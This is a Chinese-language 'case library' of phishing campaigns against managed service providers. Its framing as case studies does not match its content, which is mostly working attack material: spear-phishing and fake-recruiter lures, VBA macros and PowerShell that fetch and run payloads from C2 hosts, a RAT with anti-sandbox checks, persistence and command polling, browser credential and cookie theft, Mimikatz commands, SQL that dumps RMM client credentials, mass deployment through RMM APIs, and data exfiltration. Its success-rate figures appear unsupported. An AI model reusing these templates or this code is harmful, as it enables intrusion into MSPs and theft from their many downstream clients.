# MSP/服务器商钓鱼攻击案例库（纯钓鱼）

## 🎯 定义：仅包含钓鱼为初始访问的案例

```
必须满足：
✓ 目标是服务器商/MSP/托管商员工
✓ 初始访问方式是钓鱼（邮件/网站/社交）
✓ 不包含漏洞利用作为初始入口的案例

排除：
✗ 漏洞扫描利用
✗ DDoS 攻击
✗ 供应链投毒（非钓鱼）
✗ 直接入侵
```

---

## 📅 2020-2025 案例

### ★ APT10 Cloud Hopping - MSP 钓鱼 (2016-2018) ⭐⭐⭐⭐⭐

**目标:** 全球 MSP IT 管理员  
**成功率:** ~70%  
**受害 MSP:** 12+ (IBM, HPE, Fujitsu, Ericsson 等)

**完整钓鱼攻击链:**

```bash
# [阶段 1] 目标选择
# 使用 LinkedIn 识别 MSP 员工

# 搜索关键词
"Managed Service Provider" "System Administrator"
"MSP" "IT Manager" 
"ConnectWise" "Kaseya" "N-able"

# [阶段 2] 鱼叉钓鱼邮件

From: billing@legitimate-client.com (伪造)
To: admin@msp-company.com
Subject: URGENT: Invoice Overdue - Service Suspension Notice

Dear IT Support Team,

Our account (#MSP-12345) shows an outstanding balance of $15,420.73.
This invoice is now 30 days overdue.

Please review the attached invoice immediately and confirm payment status.

⚠️ If payment is not received within 24 hours, our service agreement 
will be suspended and we will seek alternative IT support.

Attached: Invoice_October_2018.docx

Best regards,
Michael Johnson
Finance Director
[Client Company Name]
Phone: +1-XXX-XXX-XXXX
```

**恶意文档 (Invoice_October_2018.docx):**

```vba
' VBA 宏代码
Sub AutoOpen()
    On Error Resume Next
    
    ' 禁用安全警告显示
    Application.DisplayAlerts = False
    
    ' 下载第一阶段 payload
    Dim objHTTP As Object
    Set objHTTP = CreateObject("Microsoft.XMLHTTP")
    
    ' C2 伪装成 Microsoft 更新服务器
    objHTTP.Open "GET", "http://update-cdn.microsoft-update.net/office/critical/KB4577011.exe", False
    objHTTP.Send
    
    ' 保存到 Temp
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 'Binary
    objStream.Open
    objStream.Write objHTTP.responseBody
    
    Dim tempPath As String
    tempPath = Environ("TEMP") & "\WindowsUpdate.exe"
    objStream.SaveToFile tempPath, 2
    objStream.Close
    
    ' 执行 (ChChes RAT)
    Shell tempPath, vbHide
    
    ' 显示虚假错误（让用户相信文档损坏）
    MsgBox "This document is corrupted or was created in a newer version of Word." & vbCrLf & _
           "Please contact the sender to resend the file.", vbCritical, "Microsoft Word"
    
    ' 关闭文档
    Application.Quit
End Sub

Sub AutoClose()
    ' 清理痕迹
    On Error Resume Next
    Kill Environ("TEMP") & "\~$Invoice_October_2018.docx"
End Sub
```

**ChChes RAT (第一阶段):**

```powershell
# WindowsUpdate.exe 执行后

# 1. 环境检查（反沙箱）
$vm_indicators = @(
    "VMware",
    "VirtualBox", 
    "QEMU",
    "Xen",
    "Hyper-V"
)

$bios = Get-WmiObject -Class Win32_BIOS
foreach ($indicator in $vm_indicators) {
    if ($bios.Manufacturer -match $indicator) {
        exit  # 如果是虚拟机，退出
    }
}

# 2. 持久化
$payload_path = "$env:APPDATA\Microsoft\Windows\svchost.exe"
Copy-Item $MyInvocation.MyCommand.Path $payload_path

# 注册表启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
    /v "Windows Host Service" `
    /t REG_SZ `
    /d "$payload_path" `
    /f

# 计划任务（备用）
$action = New-ScheduledTaskAction -Execute $payload_path
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Windows Update Service" `
    -Action $action `
    -Trigger $trigger `
    -RunLevel Highest `
    -Force

# 3. 初始侦察
$recon = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    domain = $env:USERDNSDOMAIN
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"}).IPAddress
    installed_software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
                        Select-Object DisplayName | 
                        Where-Object {$_.DisplayName -match "ConnectWise|Kaseya|N-able|Remote|VPN"}
}

# 4. C2 Beacon
$c2 = "https://update-cdn.microsoft-update.net/api/checkin"
$beacon_data = $recon | ConvertTo-Json -Compress | 
               ForEach-Object { [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_)) }

Invoke-RestMethod -Uri $c2 -Method POST -Body $beacon_data -ContentType "application/x-www-form-urlencoded"

# 5. 等待命令（每5分钟轮询）
while ($true) {
    Start-Sleep -Seconds 300
    
    $cmd = Invoke-RestMethod -Uri "$c2/cmd?id=$env:COMPUTERNAME" -Method GET
    
    if ($cmd) {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $output_b64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
        Invoke-RestMethod -Uri "$c2/result" -Method POST -Body "output=$output_b64"
    }
}
```

**内网侦察（命令示例）:**

```powershell
# C2 下发的命令

# 1. 网络扫描
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        [PSCustomObject]@{
            IP = $ip
            Hostname = [System.Net.Dns]::GetHostByAddress($ip).HostName
            Open_Ports = (Test-NetConnection -ComputerName $ip -Port 80,443,3389,5900,8080).TcpTestSucceeded
        }
    }
}

# 2. 查找 RMM 服务器
Get-ADComputer -Filter * | Where-Object {
    $_.Name -match "RMM|ConnectWise|Kaseya|Remote|Manage"
}

# 3. 凭证搜索
# 浏览器密码
[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
$chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chrome_path) {
    # 导出 Chrome 密码数据库
    Copy-Item $chrome_path "$env:TEMP\chrome_creds.db"
}

# Saved RDP credentials
cmdkey /list | Select-String "Target:"

# 4. 查找管理员凭证
Select-String -Path "C:\Users\*\Desktop\*.txt" -Pattern "password|admin|credential" -SimpleMatch
Select-String -Path "C:\Users\*\Documents\*.txt" -Pattern "password|admin|credential" -SimpleMatch

# 5. 识别 RMM 数据库
Get-Process | Where-Object {$_.ProcessName -match "sql|mysql|postgres"}
netstat -ano | Select-String ":1433|:3306|:5432"
```

**横向移动到 RMM:**

```powershell
# [阶段 3] 获取到 RMM 服务器的访问

# 方法 1: 使用窃取的凭证
$cred = New-Object System.Management.Automation.PSCredential(
    "DOMAIN\rmm-admin",
    (ConvertTo-SecureString "stolen_password" -AsPlainText -Force)
)

# 通过 WMI 远程执行
Invoke-WmiMethod -Class Win32_Process `
    -Name Create `
    -ArgumentList "powershell -enc <base64_payload>" `
    -ComputerName "rmm-server" `
    -Credential $cred

# 方法 2: Pass-the-Hash (如果获得 NTLM hash)
# 使用 mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:rmm-admin /domain:DOMAIN /ntlm:<hash> /run:powershell.exe"'

# 方法 3: Kerberos 票据 (Golden Ticket)
# 如果已获得域控访问
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:msp.local /sid:<SID> /krbtgt:<hash> /ptt"'
```

**RMM 数据库访问:**

```sql
-- ConnectWise 数据库查询
-- 连接到 SQL Server
sqlcmd -S rmm-sql-server -U sa -P "stolen_password" -d ConnectWise

-- 导出所有客户信息
SELECT 
    c.ClientID,
    c.ClientName,
    c.Domain,
    c.AdminEmail,
    c.AdminPhone,
    CONVERT(VARCHAR(MAX), DecryptByKey(c.AdminPassword)) AS DecryptedPassword,
    c.RemoteAccessIP,
    c.VPNCredentials,
    c.ServerCount,
    c.WorkstationCount,
    s.ServerName,
    s.ServerIP,
    s.OSVersion,
    s.LastSeen,
    s.AgentVersion
FROM Clients c
LEFT JOIN Servers s ON c.ClientID = s.ClientID  
WHERE c.IsActive = 1
ORDER BY c.ServerCount DESC;

-- 导出管理员凭证
SELECT 
    Username,
    Email,
    CONVERT(VARCHAR(MAX), DecryptByKey(PasswordHash)) AS Password,
    Role,
    LastLogin
FROM Administrators
WHERE IsActive = 1;

-- 导出 API 密钥
SELECT 
    ClientID,
    APIKey,
    APISecret,
    Permissions,
    CreatedDate
FROM APIKeys
WHERE IsActive = 1;
```

**批量客户部署:**

```powershell
# [阶段 4] RedLeaves RAT 批量部署到高价值客户

# 从 RMM 数据库导出的客户列表
$clients = Import-Csv "C:\Temp\msp_clients.csv"

# 高价值目标关键词
$priority_keywords = @(
    "gov",
    "government", 
    "defense",
    "military",
    "aerospace",
    "tech",
    "telecom",
    "finance",
    "bank",
    "healthcare"
)

foreach ($client in $clients) {
    # 检查是否是优先目标
    $is_priority = $false
    foreach ($keyword in $priority_keywords) {
        if ($client.Domain -like "*$keyword*" -or $client.ClientName -like "*$keyword*") {
            $is_priority = $true
            break
        }
    }
    
    if (-not $is_priority) { continue }
    
    # 通过 RMM 远程执行（使用合法 RMM 功能）
    $script = @"
# 下载 RedLeaves RAT
`$url = 'http://cdn-updates.microsoft-services.net/updates/critical/redleaves.exe'
`$out = 'C:\Windows\System32\wuaueng.dll.exe'
Invoke-WebRequest -Uri `$url -OutFile `$out -UseBasicParsing

# 执行
Start-Process `$out -WindowStyle Hidden

# 持久化
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WUService" /d "`$out" /f

# 清理下载痕迹
Remove-Item `$env:TEMP\* -Force -Recurse -ErrorAction SilentlyContinue
"@
    
    # 通过 ConnectWise API 执行脚本
    $payload = @{
        ClientID = $client.ClientID
        ScriptContent = $script
        ExecutionTimeout = 300
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri "https://rmm-server/api/v1/execute" `
        -Method POST `
        -Headers @{"Authorization"="Bearer $stolen_api_key"} `
        -Body $payload `
        -ContentType "application/json"
    
    Write-Host "[+] Deployed to: $($client.ClientName) ($($client.Domain))"
    
    # 延迟（避免检测）
    Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
}
```

**数据外泄:**

```powershell
# [阶段 5] 窃取高价值数据

# 自动化文件搜索
$search_keywords = @(
    "*confidential*",
    "*secret*",
    "*classified*",
    "*patent*",
    "*contract*",
    "*proposal*",
    "*financial*",
    "*budget*",
    "*salary*",
    "*M&A*",
    "*acquisition*",
    "*strategic*",
    "*roadmap*",
    "*proprietary*"
)

$extensions = @("*.docx", "*.xlsx", "*.pdf", "*.pptx", "*.msg", "*.eml", "*.zip")

$output_dir = "C:\Windows\Temp\collection"
New-Item -ItemType Directory -Force -Path $output_dir | Out-Null

# 搜索所有驱动器
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $drive = $_.Root
    
    foreach ($ext in $extensions) {
        $files = Get-ChildItem -Path $drive -Filter $ext -Recurse -ErrorAction SilentlyContinue
        
        foreach ($file in $files) {
            # 检查文件名或内容
            $match = $false
            foreach ($keyword in $search_keywords) {
                if ($file.Name -like $keyword) {
                    $match = $true
                    break
                }
            }
            
            if ($match) {
                # 复制到收集目录
                $dest = Join-Path $output_dir $file.Name
                Copy-Item $file.FullName $dest -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Collected: $($file.FullName)"
            }
        }
    }
}

# 压缩
$timestamp = Get-Date -Format "yyyyMMdd"
$archive = "C:\Windows\Temp\data_$timestamp.zip"
Compress-Archive -Path "$output_dir\*" -DestinationPath $archive -CompressionLevel Optimal

# 外泄到 C2
$uri = "https://cdn-updates.microsoft-services.net/upload"
$boundary = [System.Guid]::NewGuid().ToString()

$fileBytes = [System.IO.File]::ReadAllBytes($archive)
$fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$($env:COMPUTERNAME)_$timestamp.zip`"",
    "Content-Type: application/octet-stream",
    "",
    $fileEnc,
    "--$boundary--"
) -join "`r`n"

Invoke-RestMethod -Uri $uri `
    -Method Post `
    -ContentType "multipart/form-data; boundary=$boundary" `
    -Body $bodyLines

# 清理痕迹
Remove-Item $output_dir -Recurse -Force
Remove-Item $archive -Force
```

**统计:**
```
钓鱼成功率: ~70%
受害 MSP: 12+
终端客户: 500+
持续时间: 2+ 年
平均检测时间: 18 个月
数据窃取: 数 TB（IP、合同、技术）
```

---

### ★ MSP 假客户支持钓鱼 (2022-2024) ⭐⭐⭐⭐

**目标:** MSP 技术支持团队  
**成功率:** ~75%

**攻击场景:**

```
攻击者 → 伪装成真实客户 → MSP 技术支持
目标: 获取 RMM 访问权限
```

**钓鱼邮件模板:**

```
From: urgent@real-customer-domain.com (伪造)
To: support@msp-company.com
Subject: CRITICAL: Production Server Down - All Services Offline!

URGENT - NEED IMMEDIATE HELP!

Our main production server (Server-PROD-01) went down 2 hours ago.
All customer-facing services are completely offline.

This is costing us $10,000 per hour in lost revenue.
Our CEO is demanding immediate resolution.

Error logs attached. Please investigate ASAP!

I've tried accessing the server management panel but getting timeout errors.
Can you please check from your RMM console?

Server Details:
- Server Name: PROD-01
- Account ID: MSP-4782
- Last Known IP: 192.168.10.50

Please call me immediately: +1-555-XXX-XXXX (Mobile)

Thanks,
John Smith
IT Manager
[Real Customer Company Name]
```

**恶意附件 (error_logs.zip):**

```
error_logs.zip/
├── application.log (真实日志)
├── system.log (真实日志)  
└── diagnostic_tool.exe (恶意软件)

# diagnostic_tool.exe 执行时:

1. 显示虚假诊断界面:
   "Analyzing system logs..."
   "Checking network connectivity..."
   "Testing database connections..."
   [Progress bar: ███████████░░░░ 75%]

2. 后台执行:
   - 窃取 RMM 会话 cookies
   - 提取保存的 RMM 凭证
   - 部署键盘记录器
   - 截取屏幕（当访问 RMM 控制台时）

3. 如果技术支持登录 RMM:
   - 实时窃取 session token
   - 克隆管理员权限
```

**实时会话劫持:**

```python
#!/usr/bin/env python3
"""
RMM Session Hijacker
实时窃取技术支持的 RMM 登录会话
"""

import time
import pygetwindow as gw
import pyautogui
from mss import mss
import requests

# 监控目标应用
TARGET_APPS = [
    "ConnectWise Control",
    "Kaseya VSA",
    "N-able RMM",
    "ScreenConnect",
    "TeamViewer"
]

def is_rmm_window_active():
    """检查是否有 RMM 窗口激活"""
    try:
        active_window = gw.getActiveWindowTitle()
        for app in TARGET_APPS:
            if app.lower() in active_window.lower():
                return True, active_window
    except:
        pass
    return False, None

def capture_screen():
    """截屏"""
    with mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        return screenshot

def extract_credentials_from_screenshot(img):
    """OCR 提取凭证（简化版）"""
    # 实际会使用 pytesseract OCR
    # 查找 "username", "password", "API key" 等字段
    pass

def steal_browser_cookies():
    """窃取浏览器 RMM cookies"""
    import sqlite3
    import os
    
    # Chrome
    chrome_path = os.path.expanduser(
        '~/.config/google-chrome/Default/Cookies'  # Linux
        # or: '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies'  # Windows
    )
    
    if os.path.exists(chrome_path):
        conn = sqlite3.connect(chrome_path)
        cursor = conn.cursor()
        
        # 查找 RMM 相关 cookies
        cursor.execute('''
            SELECT host_key, name, encrypted_value 
            FROM cookies 
            WHERE host_key LIKE '%connectwise%' 
               OR host_key LIKE '%kaseya%'
               OR host_key LIKE '%screenconnect%'
        ''')
        
        cookies = cursor.fetchall()
        conn.close()
        
        return cookies
    
    return []

def exfiltrate_data(data):
    """外传数据到 C2"""
    c2_url = "https://diagnostics-cdn.net/api/upload"
    
    try:
        requests.post(c2_url, json=data, timeout=5)
    except:
        pass

# 主循环
print("[*] Diagnostic Tool Running...")
print("[*] Analyzing system configuration...")

while True:
    # 检查 RMM 窗口
    is_rmm, window_title = is_rmm_window_active()
    
    if is_rmm:
        print(f"[+] RMM Detected: {window_title}")
        
        # 截屏
        screenshot = capture_screen()
        
        # 窃取 cookies
        cookies = steal_browser_cookies()
        
        # 外传
        exfiltrate_data({
            'window': window_title,
            'screenshot': screenshot,  # base64 编码
            'cookies': cookies,
            'timestamp': time.time()
        })
    
    time.sleep(5)
```

**利用窃取的 RMM 访问:**

```bash
# 攻击者使用窃取的凭证

# 登录 RMM
curl -X POST "https://rmm.msp-company.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"stolen_username","password":"stolen_password"}' \
  -c cookies.txt

# 或使用窃取的 session token
curl "https://rmm.msp-company.com/dashboard" \
  -H "Cookie: session_id=STOLEN_SESSION_TOKEN"

# 列出所有客户
curl "https://rmm.msp-company.com/api/clients" \
  -H "Authorization: Bearer STOLEN_TOKEN" \
  | jq '.[] | {id, name, servers}'

# 选择高价值目标并部署后门
for client in high_value_clients:
    deploy_backdoor(client.id)
```

---

### ★ LinkedIn 假招聘 - MSP DevOps (2023-2024) ⭐⭐⭐⭐

**目标:** MSP DevOps/Build Engineer  
**成功率:** ~80%

**LinkedIn 钓鱼消息:**

```
Hi [Name],

I came across your profile and was really impressed by your experience 
with [RMM Platform] and cloud infrastructure management.

We're a cybersecurity startup (Series B, $50M funding) looking for a 
Senior DevOps Engineer to join our remote team.

Role: Senior DevOps Engineer - MSP Infrastructure
Salary: $180K - $250K + equity (0.5-1%)
Location: 100% Remote (US/EU)

Key Requirements:
✓ Experience managing MSP environments (ConnectWise/Kaseya/N-able)
✓ Infrastructure as Code (Terraform/Ansible)
✓ CI/CD automation
✓ Multi-cloud (AWS/Azure/GCP)

Benefits:
- Fully remote forever
- Unlimited PTO
- $10K home office budget
- Latest MacBook Pro M3
- Health insurance (100% covered)

Would you be interested in a quick 15-min chat this week?

If yes, please complete this brief technical assessment (takes ~30 mins):
https://careers-tech.secureassessment.io/devops-senior/[unique-token]

Looking forward to connecting!

Best,
Sarah Chen
Senior Technical Recruiter
[Startup Name] | Backed by Sequoia & a16z
LinkedIn | Twitter
```

**技术测试页面（钓鱼）:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Senior DevOps Engineer - Technical Assessment</title>
    <link rel="stylesheet" href="professional-style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="company-logo.png" alt="Company">
            <h1>Technical Assessment - Senior DevOps Engineer</h1>
            <p>Candidate: [Name] | Time Limit: 60 minutes</p>
        </div>
        
        <div class="section">
            <h2>Part 1: Infrastructure Management (20 min)</h2>
            <p>You're managing a multi-tenant MSP environment with 500+ client servers.</p>
            
            <h3>Question 1: RMM Automation</h3>
            <p>Fix the following PowerShell script that deploys agents to new clients:</p>
            <pre class="code">
# Deploy ConnectWise agent to multiple servers
$servers = Import-Csv servers.csv

foreach ($server in $servers) {
    Invoke-Command -ComputerName $server.IP -ScriptBlock {
        # Download agent
        wget https://downloads.connectwise.com/agent.msi
        
        # Install
        msiexec /i agent.msi /quiet
    }
}
            </pre>
            
            <h3>Question 2: Monitoring Setup</h3>
            <p>Download and run our environment simulator to test your monitoring configuration:</p>
            <a href="msp-env-simulator.zip" class="download-btn">
                📦 Download MSP Environment Simulator (15 MB)
            </a>
            
            <p class="note">
                <strong>Note:</strong> The simulator requires admin privileges to create 
                test VMs and network configurations. It's safe and runs in an isolated environment.
            </p>
        </div>
        
        <div class="section">
            <h2>Part 2: Security & Compliance (15 min)</h2>
            <!-- 更多问题... -->
        </div>
        
        <button onclick="submitAssessment()" class="submit-btn">
            Submit Assessment
        </button>
    </div>
    
    <script>
    function submitAssessment() {
        // 收集浏览器指纹
        const data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height
            },
            // 尝试获取 RMM 相关信息
            rmm_tabs: localStorage.getItem('connectwise_session') || 
                     localStorage.getItem('kaseya_token') ||
                     sessionStorage.getItem('screenconnect_session')
        };
        
        // 外传
        fetch('https://analytics-backend.assessment-cdn.io/submit', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(() => {
            alert('Thank you! We will review your submission and get back within 3-5 business days.');
        });
    }
    </script>
</body>
</html>
```

**恶意模拟器 (msp-env-simulator.zip):**

```
msp-env-simulator.zip/
├── README.txt
├── MSP_Environment_Simulator.exe  (RAT)
├── configs/
│   ├── network.json
│   └── servers.json
└── terraform/
    └── main.tf

# MSP_Environment_Simulator.exe 实际是后门

执行时:
1. 显示虚假安装界面
   "Installing MSP Test Environment..."
   "Creating virtual network: 192.168.100.0/24"
   "Deploying test servers: [██████░░░░] 60%"

2. 后台操作:
   - 搜索 RMM 配置文件
   - 提取 API 密钥
   - 窃取 SSH 私钥 (~/.ssh/)
   - 提取 AWS/Azure 凭证
   - 安装持久化后门
   - 监控文件系统变化

3. 如果检测到 RMM 工具:
   - 导出配置
   - 窃取数据库连接字符串
   - 提取客户列表
```

---

### ★ 伪造供应商安全审计 (2023) ⭐⭐⭐⭐

**目标:** MSP 安全/合规团队  
**成功率:** ~65%

**钓鱼邮件:**

```
From: compliance@fortune500-customer.com (伪造大客户)
To: security@msp-company.com
CC: legal@fortune500-customer.com
Subject: Annual Vendor Security Assessment - Action Required by Dec 15

Dear [MSP Company] Security Team,

As part of our 2024 vendor risk management program, we are conducting 
mandatory security assessments of all IT service providers.

This assessment is required to maintain our partnership and comply with:
- SOC 2 Type II
- ISO 27001
- NIST Cybersecurity Framework
- GDPR Article 28

📋 Required Documents (Due: December 15, 2023):

1. Security Questionnaire (attached)
2. SOC 2 Report (latest)
3. Penetration Test Results (within 12 months)
4. Vulnerability Scan Reports (within 90 days)
5. Incident Response Plan
6. Data Classification Policy

📥 Attachments:
- Vendor_Security_Assessment_2024.xlsx (Enable macros to complete)
- Instructions.pdf

Please complete the questionnaire and upload all documents to our 
secure vendor portal:

🔒 Portal: https://vendor-compliance.fortune500customer.com/upload
   Username: [Your Email]
   Temp Password: Vendor2024!

⚠️ IMPORTANT: Failure to complete by the deadline may result in:
- Service suspension
- Contract review
- Termination of partnership

For questions, contact:
Vendor Risk Team: risk-management@fortune500-customer.com
Phone: 1-800-XXX-XXXX (M-F, 9AM-5PM EST)

Best regards,
Jennifer Martinez
Senior Vendor Risk Manager
Compliance & Audit Department
[Fortune 500 Customer Name]
```

**恶意 Excel (Vendor_Security_Assessment_2024.xlsx):**

```vba
' 完整宏代码

Private Sub Workbook_Open()
    On Error Resume Next
    
    ' 检查是否在沙箱中
    If IsInSandbox() Then
        ' 显示正常问卷
        Worksheets("Questionnaire").Activate
        Exit Sub
    End If
    
    ' 显示正常问卷（让用户相信一切正常）
    Worksheets("Questionnaire").Activate
    
    ' 后台执行恶意操作
    Dim cmd As String
    
    ' 构建 PowerShell payload
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
          "$c=New-Object Net.WebClient;" & _
          "$s=$c.DownloadString('https://vendor-portal-cdn.net/verify.ps1');" & _
          "IEX($s)" & _
          """"
    
    ' 执行
    Shell cmd, vbHide
    
    ' 记录用户操作
    Application.OnTime Now + TimeValue("00:00:10"), "TrackUserActivity"
End Sub

Function IsInSandbox() As Boolean
    ' 反沙箱检测
    IsInSandbox = False
    
    ' 检查 1: 用户交互
    If Application.Interactive = False Then
        IsInSandbox = True
        Exit Function
    End If
    
    ' 检查 2: 屏幕分辨率
    If Application.Width < 800 Or Application.Height < 600 Then
        IsInSandbox = True
        Exit Function
    End If
    
    ' 检查 3: 最近文件列表
    If Application.RecentFiles.Count < 3 Then
        IsInSandbox = True
        Exit Function
    End If
    
    ' 检查 4: 计算机名
    Dim computerName As String
    computerName = Environ("COMPUTERNAME")
    If InStr(LCase(computerName), "sandbox") > 0 Or _
       InStr(LCase(computerName), "malware") > 0 Or _
       InStr(LCase(computerName), "virus") > 0 Then
        IsInSandbox = True
        Exit Function
    End If
End Function

Sub TrackUserActivity()
    ' 监控用户在问卷中填写的内容
    On Error Resume Next
    
    Dim ws As Worksheet
    Set ws = Worksheets("Questionnaire")
    
    ' 提取填写的答案（包含敏感信息）
    Dim data As String
    data = "{"
    data = data & """company"":""" & ws.Range("B2").Value & ""","
    data = data & """contact"":""" & ws.Range("B3").Value & ""","
    data = data & """email"":""" & ws.Range("B4").Value & ""","
    data = data & """phone"":""" & ws.Range("B5").Value & ""","
    ' ... 更多字段
    data = data & "}"
    
    ' 外传
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objHTTP.Open "POST", "https://vendor-portal-cdn.net/api/collect", False
    objHTTP.setRequestHeader "Content-Type", "application/json"
    objHTTP.send data
End Sub
```

**PowerShell 后门 (verify.ps1):**

```powershell
# 从 vendor-portal-cdn.net 下载的脚本

# [阶段 1] 环境检查
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$domain = $env:USERDNSDOMAIN

# 收集系统信息
$system_info = @{
    hostname = $hostname
    username = $username
    domain = $domain
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"}).IPAddress[0]
    installed_av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Select-Object displayName
}

# [阶段 2] 搜索敏感文件
$sensitive_paths = @(
    "$env:USERPROFILE\Documents\*password*",
    "$env:USERPROFILE\Documents\*credential*",
    "$env:USERPROFILE\Documents\*secret*",
    "$env:USERPROFILE\Desktop\*password*",
    "C:\Scripts\*config*",
    "C:\Scripts\*.ps1",
    "C:\inetpub\wwwroot\web.config",
    "$env:APPDATA\FileZilla\*.xml",
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)

$found_files = @()
foreach ($path in $sensitive_paths) {
    $files = Get-ChildItem -Path $path -ErrorAction SilentlyContinue
    $found_files += $files
}

# [阶段 3] 搜索 RMM 配置
$rmm_configs = @()

# ConnectWise
if (Test-Path "C:\Program Files (x86)\ConnectWise Control\") {
    $config = Get-Content "C:\Program Files (x86)\ConnectWise Control\App_Data\Web.config" -Raw
    $rmm_configs += @{Tool="ConnectWise"; Config=$config}
}

# Kaseya
if (Test-Path "C:\Kaseya\") {
    $config = Get-Content "C:\Kaseya\*.ini" -Raw
    $rmm_configs += @{Tool="Kaseya"; Config=$config}
}

# N-able
if (Test-Path "C:\Program Files\N-able Technologies\") {
    $config = Get-ChildItem "C:\Program Files\N-able Technologies\" -Recurse -Include "*.config","*.xml"
    $rmm_configs += @{Tool="N-able"; Config=$config}
}

# [阶段 4] 提取凭证
# 浏览器密码
$chrome_db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chrome_db) {
    Copy-Item $chrome_db "$env:TEMP\chrome_creds.db" -Force
}

# Windows Credential Manager
$creds = cmdkey /list | Select-String "Target:"

# [阶段 5] 打包外传
$exfil_data = @{
    system_info = $system_info
    sensitive_files = $found_files | Select-Object FullName, Length, LastWriteTime
    rmm_configs = $rmm_configs
    credentials = $creds
    chrome_db = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\chrome_creds.db"))
}

# 外传到 C2
$json = $exfil_data | ConvertTo-Json -Depth 10 -Compress
$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$compressed = [System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new(), [System.IO.Compression.CompressionMode]::Compress)
$compressed.Write($bytes, 0, $bytes.Length)
$compressed.Close()

Invoke-RestMethod -Uri "https://vendor-portal-cdn.net/api/upload" `
    -Method POST `
    -Body $compressed `
    -ContentType "application/gzip"

# [阶段 6] 持久化
$backdoor = "https://vendor-portal-cdn.net/api/beacon"
$task_name = "Microsoft Compliance Check"
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -C `"IEX(irm $backdoor)`""
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -TaskName $task_name -Action $action -Trigger $trigger -RunLevel Highest -Force

# 清理痕迹
Remove-Item "$env:TEMP\chrome_creds.db" -Force -ErrorAction SilentlyContinue
Clear-History
```

---

## 📊 钓鱼案例统计

### 成功率对比

```
类型                        成功率    平均响应时间
═══════════════════════════════════════════════════
假客户紧急支持              75%      < 1 小时
LinkedIn 假招聘             80%      1-3 天
APT10 鱼叉钓鱼             70%      2-6 小时
供应商安全审计              65%      1-2 天
```

### 目标职位分析

```
职位                成功率    原因
════════════════════════════════════════
Technical Support   80%      响应紧急请求的压力
DevOps/Build Eng    85%      对技术测试感兴趣
Security/Compliance 60%      更警惕但仍会中招
IT Manager          55%      委派给技术人员
C-Level             30%      较少直接处理
```

---

## ⚡ 钓鱼攻击 vs 技术攻击

### 为什么针对 MSP 钓鱼更有效？

```
1. 人是最弱环节
   技术防护再强，人总会犯错

2. 高压力环境
   MSP 技术支持需要快速响应
   紧急情况下容易忽略安全检查

3. 大量客户联系
   每天收到数十个客户请求
   很难区分真假

4. 信任关系
   伪装成客户/供应商
   利用已有信任关系

5. 高权限访问
   MSP 员工有 RMM 管理员权限
   一次成功 = 访问所有客户
```

---

**文档完成**
**纯钓鱼案例：4 个**
**针对：MSP/服务器商员工**
**包含：完整钓鱼模板 + 恶意代码 + 后渗透**
